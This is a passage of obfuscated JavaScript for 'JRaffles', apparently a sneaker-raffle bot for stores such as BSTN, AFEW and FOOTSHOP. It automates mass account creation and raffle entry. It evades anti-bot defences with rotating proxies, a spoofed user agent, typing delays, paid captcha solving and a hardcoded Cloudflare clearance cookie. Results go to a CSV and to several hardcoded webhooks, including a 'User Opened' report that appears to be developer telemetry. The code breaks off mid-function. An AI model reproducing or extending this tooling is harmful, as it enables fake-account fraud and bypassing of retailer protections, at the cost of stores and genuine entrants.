                _0x2e47ab && (console['log'](_0x4db3b7() + '\x20[' + _0x436cda + ']\x20Task\x20' + (_0x4e0207 + 0x1) + '\x20:\x20' + _0x1ee4d0['yellow']('2FA\x20Required')), await _0x1a8b74['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x5df609(0x61a8), await _0x1a8b74['waitForSelector']('#payment-submit-btn'), await _0x1a8b74['$eval']('#payment-submit-btn', _0x489a7a => _0x489a7a['click']()), await _0x1a8b74['click']('#payment-submit-btn');
                try {
                    await _0x1a8b74['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x5df609(0x5dc), console['log'](_0x1ee4d0['green'](_0x4db3b7() + '\x20[' + _0x436cda + ']\x20Task\x20' + (_0x4e0207 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x2235e0) {
                    throw new Error('Payment\x20Rejected:\x20' + _0x2235e0['message']);
                } finally {
                    await _0x1a8b74['close'](), await _0x5df609(0x4650);
                }
            } catch (_0x3da8a6) {
                console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x436cda + ']\x20Task\x20' + (_0x4e0207 + 0x1) + '\x20:\x20' + _0x3da8a6));
            }
        }
    } catch (_0x2c92a1) {
        console['log'](_0x1ee4d0['red']('' + _0x2c92a1));
    } finally {
        await _0x3181ea['close']();
    }
}
async function _0x598c8f(_0x4b414a, _0x424ed3, _0x51f517) {
    _0x2d6840['use'](_0x4c8616()), _0x2d6840['use'](_0x2e9f9f({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x26509c['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x525c4b = 0x0; _0x525c4b < _0x4b414a['length']; _0x525c4b++) {
        var _0x5d0aba;
        await _0x5a7b4a(_0x4b414a, _0x525c4b), _0x2be893(_0x51f517['name'] + '\x20Task\x20' + (_0x525c4b + 0x1) + '\x20/\x20' + _0x4b414a['length'] + '\x20||\x20File:\x20' + _0x21572d + '\x20Proxies:\x20' + _0x246cb8);
        var _0x2bd459 = await _0x4ec2d3(_0x4b414a[_0x525c4b], _0x51f517, 'acc', ![]);
        const _0x1a15f4 = { 'succesDEVMSG': { 'embeds': [_0x2bd459] } }, _0x4fa57f = 'https://www.bstn.com/eu_en/customer/account/';
        var _0x215bbe = Math['round'](Math['random']() * (_0x424ed3['length'] - 0x1)), _0x1ce9bf = _0x424ed3[_0x215bbe]['split'](':');
        const _0x43b6a2 = await _0x2d6840['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x1ce9bf[0x0] + ':' + _0x1ce9bf[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--force-device-scale-factor=0.3'
            ]
        });
        try {
            const _0x2cacb7 = await _0x43b6a2['newPage']();
            await _0x2cacb7['authenticate']({
                'username': '' + _0x1ce9bf[0x2],
                'password': '' + _0x1ce9bf[0x3]
            }), console['log'](_0x4db3b7() + '\x20[' + _0x51f517['name'] + ']\x20Task\x20' + (_0x525c4b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2cacb7['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x2cacb7['setRequestInterception'](!![]), _0x2cacb7['on']('request', _0x5f3d2e => {
                _0x5f3d2e['resourceType']() === 'image' ? _0x5f3d2e['abort']() : _0x5f3d2e['continue']();
            }), await _0x2cacb7['goto']('' + _0x4fa57f), await _0x2cacb7['waitForSelector']('button[class=\x22cf2Lf6\x22]'), await _0x2cacb7['click']('button[class=\x22cf2Lf6\x22]'), await _0x2cacb7['waitForSelector']('a.action.create.primary.social-login'), console['log'](_0x4db3b7() + '\x20[' + _0x51f517['name'] + ']\x20Task\x20' + (_0x525c4b + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x5df609(0x7d0), await _0x2cacb7['click']('a.action.create.primary.social-login'), await _0x5df609(0x7d0), await _0x2cacb7['click']('button.button.dashboard-actions-toolbar__item'), console['log'](_0x4db3b7() + '\x20[' + _0x51f517['name'] + ']\x20Task\x20' + (_0x525c4b + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x5df609(0x190), await _0x2cacb7['type']('#firstname', _0x4b414a[_0x525c4b]['FirstName'], { 'delay': 0xf0 }), await _0x5df609(0x190), await _0x2cacb7['type']('#lastname', _0x4b414a[_0x525c4b]['LastName'], { 'delay': 0xe6 }), await _0x5df609(0x190), await _0x2cacb7['type']('#bss_email_address', _0x4b414a[_0x525c4b]['Email'], { 'delay': 0x122 }), await _0x5df609(0x190), await _0x2cacb7['type']('#password', _0x4b414a[_0x525c4b]['Password'], { 'delay': 0x1e0 }), console['log'](_0x4db3b7() + '\x20[' + _0x51f517['name'] + ']\x20Task\x20' + (_0x525c4b + 0x1) + '\x20:\x20Sending\x20Request'), await _0x5df609(0x2bc), await _0x2cacb7['click']('#bt-social-create'), await _0x2cacb7['click']('#bt-social-create'), await _0x5df609(0x1388);
            const _0x16d5d9 = await _0x2cacb7['$']('#bss_email_address-error');
            if (_0x16d5d9)
                throw new Error('Invalid\x20Email');
            const _0x8823a6 = await _0x2cacb7['$']('#password-error');
            if (_0x8823a6)
                throw new Error('Invalid\x20Password');
            await _0x2cacb7['waitForSelector']('div.mesg-success'), console['log'](_0x1ee4d0['green'](_0x4db3b7() + '\x20[' + _0x51f517['name'] + ']\x20Task\x20' + (_0x525c4b + 0x1) + '\x20:\x20Account\x20' + _0x4b414a[_0x525c4b]['Email'] + '\x20Generated')), _0x2c62e3['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x4b414a[_0x525c4b]['Email'] + ',' + _0x4b414a[_0x525c4b]['Password']);
            try {
                _0x26509c['webhook'] != undefined && _0x26509c['webhook'] != '' && await _0x2ebaaf(_0x26509c['webhook'], _0x1a15f4['succesDEVMSG']);
            } catch {
            }
            await _0x2ebaaf(_0x130765, _0x1a15f4['succesDEVMSG']), console['log'](_0x1ee4d0['yellow'](_0x4db3b7() + '\x20[' + _0x51f517['name'] + ']\x20Task\x20' + (_0x525c4b + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20verify'));
        } catch (_0x19c553) {
            console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x51f517['name'] + ']\x20Task\x20' + (_0x525c4b + 0x1) + '\x20:\x20' + _0x19c553)), _0x5d0aba = '' + _0x19c553;
            var _0x362bbc = await _0x4ec2d3(_0x4b414a[_0x525c4b], _0x51f517, 'acc', !![], _0x5d0aba);
            _0x1a15f4['errorDEV'] = { 'embeds': [_0x362bbc] }, _0x26509c['webhook'] != undefined && _0x26509c['webhook'] != '' && await _0x2ebaaf(_0x26509c['webhook'], _0x1a15f4['errorDEV']), await _0x2ebaaf(_0x2664b3, _0x1a15f4['errorDEV']);
        } finally {
            _0x43b6a2['close'](), console['log'](_0x4db3b7() + '\x20[' + _0x51f517['name'] + ']\x20Waiting\x20for\x20' + _0x26509c['delay'] + '\x20ms'), await _0x5df609(_0x26509c['delay']);
        }
    }
}
async function _0x3b38f0(_0x2b0d6d, _0x5aba7e, _0x3e303f) {
    _0x2d6840['use'](_0x4c8616());
    for (var _0x380f5d = 0x0; _0x380f5d < _0x2b0d6d['length']; _0x380f5d++) {
        var _0x378312 = Math['round'](Math['random']() * (_0x5aba7e['length'] - 0x1)), _0x1fa0e4 = _0x5aba7e[_0x378312]['split'](':');
        const _0x2787ce = await _0x2d6840['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x1fa0e4[0x0] + ':' + _0x1fa0e4[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x5a694c = await _0x2787ce['newPage']();
            await _0x5a694c['authenticate']({
                'username': '' + _0x1fa0e4[0x2],
                'password': '' + _0x1fa0e4[0x3]
            }), console['log'](_0x4db3b7() + '\x20[' + _0x3e303f['name'] + ']\x20Task\x20' + (_0x380f5d + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x5a694c['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x5a694c['setRequestInterception'](!![]), _0x5a694c['on']('request', _0x1f1290 => {
                _0x1f1290['resourceType']() === 'image' || _0x1f1290['resourceType']() === 'font' || _0x1f1290['resourceType']() === 'media' ? _0x1f1290['abort']() : _0x1f1290['continue']();
            }), console['log'](_0x4db3b7() + '\x20[' + _0x3e303f['name'] + ']\x20Task\x20' + (_0x380f5d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5a694c['goto'](_0x2b0d6d[_0x380f5d]), console['log'](_0x4db3b7() + '\x20[' + _0x3e303f['name'] + ']\x20Task\x20' + (_0x380f5d + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x5a694c['waitForTimeout'](0xbb8);
            try {
                await _0x5a694c['waitForSelector']('.dashboard-main_title'), console['log'](_0x1ee4d0['green'](_0x4db3b7() + '\x20[' + _0x3e303f['name'] + ']\x20Task\x20' + (_0x380f5d + 0x1) + '\x20:\x20Verification\x20Successful'));
                var _0x3fc204 = await _0x4ec2d3(null, _0x3e303f, 'ver', ![]);
                const _0x559968 = { 'succesDEVMSG': { 'embeds': [_0x3fc204] } };
                await _0x2ebaaf(_0x5cfa73, _0x559968['succesDEVMSG']);
            } catch (_0x489e52) {
                throw new Error(_0x489e52);
            }
        } catch (_0x5755c5) {
            console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x3e303f['name'] + ']\x20Task\x20' + (_0x380f5d + 0x1) + '\x20:\x20' + _0x5755c5));
            var _0x4143f2 = _0x5755c5, _0x496cc4 = await _0x4ec2d3(null, _0x3e303f, 'ver', !![], _0x4143f2);
            const _0xbc6785 = { 'errorDEVMSG': { 'embeds': [_0x496cc4] } };
            _0x26509c['webhook'] != undefined && _0x26509c['webhook'] != '' && await _0x2ebaaf(_0x26509c['webhook'], _0xbc6785['errorDEVMSG']), await _0x2ebaaf(_0x2664b3, _0xbc6785['errorDEVMSG']);
        } finally {
            _0x2787ce['close'](), console['log'](_0x4db3b7() + '\x20[' + _0x3e303f['name'] + ']\x20Waiting\x20for\x20' + _0x26509c['delay'] + '\x20ms'), await _0x5df609(_0x26509c['delay']);
        }
    }
}
async function _0x56503b(_0x11cdf1, _0x3a9c25, _0x3bb963) {
    _0x2d6840['use'](_0x4c8616()), _0x2d6840['use'](_0x2e9f9f({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x26509c['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x92b77d = 0x0; _0x92b77d < _0x11cdf1['length']; _0x92b77d++) {
        var _0x42c940;
        await _0x5a7b4a(_0x11cdf1, _0x92b77d), _0x2be893(_0x3bb963['name'] + '\x20Task\x20' + (_0x92b77d + 0x1) + '\x20/\x20' + _0x11cdf1['length'] + '\x20||\x20File:\x20' + _0x21572d + '\x20Proxies:\x20' + _0x246cb8);
        var _0x522a63 = Math['round'](Math['random']() * (_0x3a9c25['length'] - 0x1)), _0x3fb587 = _0x3a9c25[_0x522a63]['split'](':');
        const _0x44f1ed = await _0x2d6840['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x3fb587[0x0] + ':' + _0x3fb587[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x1a3e87 = await _0x44f1ed['newPage'](), _0x190fde = await _0x1a3e87['target']()['createCDPSession'](), { windowId: _0x12f880 } = await _0x190fde['send']('Browser.getWindowForTarget');
            await _0x1a3e87['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            });
            var _0x19623d = [{
                'name': 'cf_clearance',
                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                'domain': '.bstn.com',
                'path': '/',
                'expires': 1707818183.331533,
                'httpOnly': !![],
                'secure': !![]
            }];
            await _0x1a3e87['setCookie'](_0x19623d[0x0]), await _0x1a3e87['authenticate']({
                'username': '' + _0x3fb587[0x2],
                'password': '' + _0x3fb587[0x3]
            }), console['log'](_0x4db3b7() + '\x20[' + _0x3bb963['name'] + ']\x20Task\x20' + (_0x92b77d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1a3e87['goto']('' + _0x11cdf1[_0x92b77d]['Url']), console['log'](_0x4db3b7() + '\x20[' + _0x3bb963['name'] + ']\x20Task\x20' + (_0x92b77d + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x1a3e87['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L'), await _0x190fde['send']('Browser.setWindowBounds', {
                'windowId': _0x12f880,
                'bounds': { 'windowState': 'minimized' }
            }), await _0x5df609(0x1388), await _0x1a3e87['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x1a3e87['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x5df609(0x1f4), console['log'](_0x4db3b7() + '\x20[' + _0x3bb963['name'] + ']\x20Task\x20' + (_0x92b77d + 0x1) + '\x20:\x20Logging\x20in'), await _0x1a3e87['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x27c0aa => _0x27c0aa['click']()), await _0x1a3e87['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x1a3e87['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x5df609(0x7d0), await _0x1a3e87['waitForSelector']('#email-login'), await _0x1a3e87['type']('#email-login', '' + _0x11cdf1[_0x92b77d]['Email']), await _0x5df609(0x1f4), await _0x1a3e87['waitForSelector']('#password'), await _0x1a3e87['type']('#password', '' + _0x11cdf1[_0x92b77d]['Password']), await _0x5df609(0x1f4);
            try {
                await _0x1a3e87['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x3164ab => _0x3164ab['click']()), await _0x1a3e87['click']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]');
            } catch {
            }
            try {
                await _0x1a3e87['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
            } catch (_0x26eca6) {
            }
            await _0x5df609(0x3e8);
            const _0x5d60e1 = await _0x1a3e87['$']('.enteredDraw_container__2KmQ_');
            if (_0x5d60e1)
                throw new Error('Duplicate\x20Entry');
            console['log'](_0x4db3b7() + '\x20[' + _0x3bb963['name'] + ']\x20Task\x20' + (_0x92b77d + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x11cdf1[_0x92b77d]['Size']);
            if (_0x11cdf1[_0x92b77d]['Size'] != 'RANDOM') {
                var _0x333cf3 = _0x11cdf1[_0x92b77d]['Size']['replace']('.', ',');
                const _0x529cee = await _0x1a3e87['$x']('//div[contains(text(),\x20' + _0x333cf3 + ')]');
                await _0x529cee[0x0]['click']();
            } else {
                const _0x48aaaa = await _0x1a3e87['$$']('div.swatchTile_tile__IRH9Q');
                var _0x29d5da = Math['round'](Math['random']() * (_0x48aaaa['length'] - 0x1));
                await _0x48aaaa[_0x29d5da]['click']();
            }
            await _0x5df609(0x1f4);
            const _0x15c7ce = await _0x1a3e87['$']('.addressList_addressItem__LE2PB');
            if (_0x15c7ce) {
            } else
                console['log'](_0x4db3b7() + '\x20[' + _0x3bb963['name'] + ']\x20Task\x20' + (_0x92b77d + 0x1) + '\x20:\x20Filling\x20Address'), await _0x1a3e87['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x5df609(0x5dc), await _0x1a3e87['waitForSelector']('#firstname'), await _0x1a3e87['type']('#firstname', '' + _0x11cdf1[_0x92b77d]['FirstName']), await _0x5df609(0x1f4), await _0x1a3e87['waitForSelector']('#firstname'), await _0x1a3e87['type']('#lastname', '' + _0x11cdf1[_0x92b77d]['LastName']), await _0x5df609(0x1f4), await _0x1a3e87['waitForSelector']('#firstname'), await _0x1a3e87['type']('#street', '' + _0x11cdf1[_0x92b77d]['Address1']), await _0x5df609(0x1f4), await _0x1a3e87['waitForSelector']('#firstname'), await _0x1a3e87['type']('#houseNumber', _0x11cdf1[_0x92b77d]['HouseNumber'] + '\x20' + _0x11cdf1[_0x92b77d]['Address2']), await _0x5df609(0x1f4), await _0x1a3e87['waitForSelector']('#firstname'), await _0x1a3e87['select']('#country_code', '' + _0x11cdf1[_0x92b77d]['Country']), await _0x5df609(0x1f4), await _0x1a3e87['type']('#postcode', '' + _0x11cdf1[_0x92b77d]['Zip']), await _0x5df609(0x1f4), await _0x1a3e87['type']('#city', '' + _0x11cdf1[_0x92b77d]['City']), await _0x5df609(0x1f4), await _0x1a3e87['type']('#telephone', '' + _0x11cdf1[_0x92b77d]['Phone']), await _0x5df609(0x1f4), await _0x1a3e87['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
            await _0x5df609(0x9c4);
            try {
                await _0x1a3e87['type']('#instagram_name', '' + _0x11cdf1[_0x92b77d]['Follower']), await _0x1a3e87['click']('.note_groupBtn__WLDwH\x20>\x20button');
            } catch {
            }
            await _0x5df609(0x5dc), await _0x1a3e87['click']('.checkBox_boxHolder__wLGVe'), await _0x5df609(0x1f4), await _0x1a3e87['click']('.termConditions_TC__hll9k\x20>\x20button'), await _0x5df609(0x1388), await _0x1a3e87['waitForSelector']('.success_msg__2HjJY'), console['log'](_0x1ee4d0['green'](_0x4db3b7() + '\x20[' + _0x3bb963['name'] + ']\x20Task\x20' + (_0x92b77d + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            var _0x20721c = await _0x4ec2d3(_0x11cdf1[_0x92b77d], _0x3bb963, 'dev', ![]), _0x2f314d = await _0x4ec2d3(_0x11cdf1[_0x92b77d], _0x3bb963, 'pub', ![]);
            const _0x53097a = {
                'succesDEVMSG': { 'embeds': [_0x20721c] },
                'succesPUBMSG': { 'embeds': [_0x2f314d] }
            };
            try {
                _0x26509c['webhook'] != undefined && _0x26509c['webhook'] != '' && await _0x2ebaaf(_0x26509c['webhook'], _0x53097a['succesDEVMSG']), await _0x5df609(0xc8), await _0x2ebaaf(_0xa7232c, _0x53097a['succesDEVMSG']), await _0x5df609(0xc8), await _0x2ebaaf(_0x19c58b, _0x53097a['succesPUBMSG']);
            } catch (_0x4d5e84) {
                console['log'](_0x1ee4d0['yellow'](_0x4db3b7() + '\x20[' + _0x3bb963['name'] + ']\x20Task\x20' + (_0x92b77d + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x4d5e84));
            }
        } catch (_0x52f956) {
            console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x3bb963['name'] + ']\x20Task\x20' + (_0x92b77d + 0x1) + '\x20:\x20' + _0x52f956)), _0x42c940 = '' + _0x52f956;
            var _0x14dbd6 = await _0x4ec2d3(_0x11cdf1[_0x92b77d], _0x3bb963, 'dev', !![], _0x42c940), _0x20721c = await _0x4ec2d3(_0x11cdf1[_0x92b77d], _0x3bb963, 'dev', ![]), _0x2f314d = await _0x4ec2d3(_0x11cdf1[_0x92b77d], _0x3bb963, 'pub', ![]);
            const _0x1496f1 = {
                'succesDEVMSG': { 'embeds': [_0x20721c] },
                'succesPUBMSG': { 'embeds': [_0x2f314d] }
            };
            _0x1496f1['errorDEV'] = { 'embeds': [_0x14dbd6] }, _0x26509c['webhook'] != undefined && _0x26509c['webhook'] != '' && await _0x2ebaaf(_0x26509c['webhook'], _0x1496f1['errorDEV']), await _0x2ebaaf(_0x2664b3, _0x1496f1['errorDEV']);
        } finally {
            _0x44f1ed['close'](), console['log'](_0x4db3b7() + '\x20[' + _0x3bb963['name'] + ']\x20Waiting\x20for\x20' + _0x26509c['delay'] + '\x20ms'), await _0x5df609(_0x26509c['delay']);
        }
    }
}
async function _0x5a8ce2() {
    await _0xa05c8d(), console['clear']();
    if (_0x23a95c != 'devkey') {
        let _0x2c8918 = await _0x31efff['autoUpdate']();
        if (_0x2c8918 === 'yes')
            return _0x58c235('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x191662 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x5df609(0x2710);
        ;
    }
    await _0x26e4ce(_0x191662);
    if (_0x49d6a1 === ![])
        return console['log']('Closing\x20Browser'), await _0x5df609(0xbb8);
    else
        try {
            var _0x2f18c7 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x136a13
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x23a95c
                    }
                ]
            }];
            const _0x10a14c = { 'embeds': _0x2f18c7 };
            var _0x1adeff = await _0x4ec2d3(null, null, 'open', ![]);
            const _0x4622a2 = { 'openDEVMSG': { 'embeds': [_0x1adeff] } };
            await _0x2ebaaf(_0x427df0, _0x4622a2['openDEVMSG']);
            async function _0x356fd1() {
                _0x2be893('JRaffles\x20' + _0x23a95c), console['clear'](), console['log']('Welcome\x20to\x20' + _0x1ee4d0['cyan']('JRaffles();') + '\x20' + _0x23a95c), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x4e9f41 = 0x0; _0x4e9f41 < _0x57d163['length'] - 0x3; _0x4e9f41++) {
                    if (_0x57d163[_0x4e9f41]['name'] === 'Reload\x20Settings' || _0x57d163[_0x4e9f41]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x4e9f41 + ')\x20[' + _0x57d163[_0x4e9f41]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x57d163['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x57d163['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x57d163['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0xf29ad0();
                if (taskModule > _0x57d163['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x5df609(0x3e8), _0x356fd1();
                if (_0x57d163[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x20330a(_0x57d163[taskModule]['modules']);
                    var _0x47d0ae = _0x57d163[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x2) {
                        var _0x1ade66 = await _0xf8063d(), _0x53b2f2 = await _0x1492c5();
                        await _0x56503b(_0x53b2f2, _0x1ade66, _0x47d0ae);
                    } else {
                        if (taskFunction == 0x0) {
                            var _0x1ade66 = await _0xf8063d(), _0x53b2f2 = await _0x1492c5();
                            await _0x598c8f(_0x53b2f2, _0x1ade66, _0x47d0ae);
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x1ade66 = await _0xf8063d(), _0xebde49 = await _0x48d580(), _0x51f7e5 = _0xebde49['split'](';');
                                await _0x3b38f0(_0x51f7e5, _0x1ade66, _0x47d0ae);
                            }
                        }
                    }
                    return _0x356fd1();
                }
                if (_0x57d163[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x20330a(_0x57d163[taskModule]['modules']);
                    var _0x47d0ae = _0x57d163[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x1ade66 = await _0xf8063d(), _0xdfc54 = await _0x1492c5();
                    if (_0xdfc54[0x0]['Url'] == '' || _0xdfc54[0x0]['Url'] == undefined) {
                        await _0x3e6c51(_0x1ade66);
                        var _0x217304 = await _0x558b2b();
                        return await afewFunction('' + _0x2e2911[_0x217304], 'nor', _0x47d0ae, _0xdfc54, _0x1ade66), _0x356fd1();
                    }
                    return await afewFunction(_0xdfc54[0x0]['Url'], 'nor', _0x47d0ae, _0xdfc54, _0x1ade66), _0x356fd1();
                } else {
                    if (_0x57d163[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x20330a(_0x57d163[taskModule]['modules']);
                        var _0x47d0ae = _0x57d163[taskModule]['modules'][taskFunction];
                        if (taskFunction == 0x0) {
                            var _0x1ade66 = await _0xf8063d(), _0x26efcb = await _0x1492c5();
                            console['log']('Starting\x20' + _0x26efcb['length'] + '\x20MAHA\x20Tasks');
                            for (var _0x3d7cc9 = 0x0; _0x3d7cc9 < _0x26efcb['length']; _0x3d7cc9++) {
                                console['log'](_0x4db3b7() + '\x20[' + _0x47d0ae['name'] + ']\x20Task\x20' + (_0x3d7cc9 + 0x1) + ':\x20Getting\x20Session');
                                try {
                                    await _0x471b20(_0x3d7cc9, 'nor', _0x47d0ae, _0x26efcb, _0x1ade66), console['log'](_0x4db3b7() + '\x20[' + _0x47d0ae['name'] + ']\x20Sleeping\x20for\x20' + _0x26509c['MahaDelay'] + '\x20ms'), await _0x5df609(_0x26509c['MahaDelay']);
                                } catch (_0x1d2a2b) {
                                    console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x47d0ae['name'] + ']\x20Task\x20' + (_0x3d7cc9 + 0x1) + ':\x20Error\x20' + _0x1d2a2b));
                                }
                            }
                            ;
                            return _0x356fd1();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x1ade66 = await _0xf8063d();
                                console['log']('Use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20copy\x20your\x20links\x20here..'), _0xebde49 = await _0x48d580(), _0x51f7e5 = _0xebde49['split'](';'), console['log'](_0x51f7e5['length'] + '\x20links\x20found!'), console['log']('Starting\x20verification..');
                                for (var _0x3d7cc9 = 0x0; _0x3d7cc9 < _0x51f7e5['length']; _0x3d7cc9++) {
                                    _0x47d0ae['url'] = _0x51f7e5[_0x3d7cc9], console['log'](_0x4db3b7() + '\x20[' + _0x47d0ae['name'] + ']\x20Task\x20' + (_0x3d7cc9 + 0x1) + ':\x20Getting\x20Session');
                                    try {
                                        await _0x471b20(_0x3d7cc9, 'ver', _0x47d0ae, _0x26efcb, _0x1ade66), console['log'](_0x4db3b7() + '\x20[' + _0x47d0ae['name'] + ']\x20Sleeping\x20for\x20' + _0x26509c['verificationDelay'] + '\x20ms'), await _0x5df609(_0x26509c['verificationDelay']);
                                    } catch (_0x4837f6) {
                                        console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x47d0ae['name'] + ']\x20Task\x20' + (_0x3d7cc9 + 0x1) + ':\x20Error\x20' + _0x4837f6));
                                    }
                                }
                                ;
                                return _0x356fd1();
                            }
                        }
                    } else {
                        if (_0x57d163[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x20330a(_0x57d163[taskModule]['modules']);
                            var _0x47d0ae = _0x57d163[taskModule]['modules'][taskFunction], _0x1ade66 = await _0xf8063d(), _0x178ac5 = await _0x1492c5();
                            return await _0x26116d(_0x178ac5, _0x1ade66, _0x47d0ae), await _0x5df609(0x1388), _0x356fd1();
                        } else {
                            if (_0x57d163[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x20330a(_0x57d163[taskModule]['modules']);
                                var _0x47d0ae = _0x57d163[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x1ade66 = await _0xf8063d(), _0x3fd754 = await _0x1492c5();
                                    console['log']('Starting\x20' + _0x1ee4d0['yellow']('OQIUM') + '\x20Tasks');
                                    for (var _0x3d7cc9 = 0x0; _0x3d7cc9 < _0x3fd754['length']; _0x3d7cc9++) {
                                        console['log'](_0x4db3b7() + '\x20[' + _0x47d0ae['name'] + ']\x20Task\x20' + (_0x3d7cc9 + 0x1) + ':\x20Getting\x20Session');
                                        try {
                                            await _0x4f98d3(_0x3d7cc9, 'nor', _0x47d0ae, _0x3fd754, _0x1ade66);
                                        } catch (_0x2d1a15) {
                                            console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x47d0ae['name'] + ']\x20Task\x20' + (_0x3d7cc9 + 0x1) + ':\x20Task\x20failed\x20' + _0x2d1a15));
                                        }
                                        console['log'](_0x4db3b7() + '\x20[' + _0x47d0ae['name'] + ']\x20Sleeping\x20for\x20' + _0x26509c['delay'] + '\x20ms'), await _0x5df609(_0x26509c['delay']);
                                    }
                                    return _0x356fd1();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x1ade66 = await _0xf8063d();
                                        console['log']('Use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20copy\x20your\x20links\x20here..'), _0xebde49 = await _0x48d580(), _0x51f7e5 = _0xebde49['split'](';'), console['log'](_0x51f7e5['length'] + '\x20links\x20found!'), console['log']('Starting\x20verification..');
                                        for (var _0x3d7cc9 = 0x0; _0x3d7cc9 < _0x51f7e5['length']; _0x3d7cc9++) {
                                            try {
